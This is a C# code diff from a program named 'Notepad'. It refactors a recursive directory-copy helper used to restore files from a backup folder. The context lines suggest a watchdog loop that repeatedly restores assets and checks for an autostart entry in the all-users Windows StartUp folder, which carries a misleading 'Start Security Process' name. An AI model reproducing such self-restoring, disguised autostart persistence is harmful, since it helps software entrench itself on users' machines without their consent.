@@ -22,10 +22,7 @@ namespace Notepad
                         }
                         
                     }
-                    foreach (string file in nestedDirectories(@".\BackupAssets\Assets"))
-                    {
-                        File.Copy(file, directoryPath);
-                    }
+                    CopyDirectory(@".\BackupAssets", directoryPath, true);
                     
                 }
                 if (!File.Exists(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\GEESEDEFENDER200 - Start Security Process"))
@@ -35,24 +32,37 @@ namespace Notepad
                 Thread.Sleep(1000);
             }
         }
-        static string[] nestedDirectories(string directoryPath)
+        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
         {
-            List<string> output = new();
-            foreach (string file in Directory.GetFiles (directoryPath))
+            // Get information about the source directory
+            var dir = new DirectoryInfo(sourceDir);
+
+            // Check if the source directory exists
+            if (!dir.Exists)
+                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");
+
+            // Cache directories before we start copying
+            DirectoryInfo[] dirs = dir.GetDirectories();
+
+            // Create the destination directory
+            Directory.CreateDirectory(destinationDir);
+
+            // Get the files in the source directory and copy to the destination directory
+            foreach (FileInfo file in dir.GetFiles())
             {
-                output.Add(file);
+                string targetFilePath = Path.Combine(destinationDir, file.Name);
+                file.CopyTo(targetFilePath);
             }
-            if (Directory.GetDirectories(directoryPath).Count() > 0)
+
+            // If recursive and copying subdirectories, recursively call this method
+            if (recursive)
             {
-                foreach (string directory in Directory.GetDirectories(directoryPath))
+                foreach (DirectoryInfo subDir in dirs)
                 {
-                    foreach (string file in nestedDirectories(directory))
-                    {
-                        output.Add(file);
-                    }
+                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
+                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                 }
             }
-            return output.ToArray();
         }
     }
 }
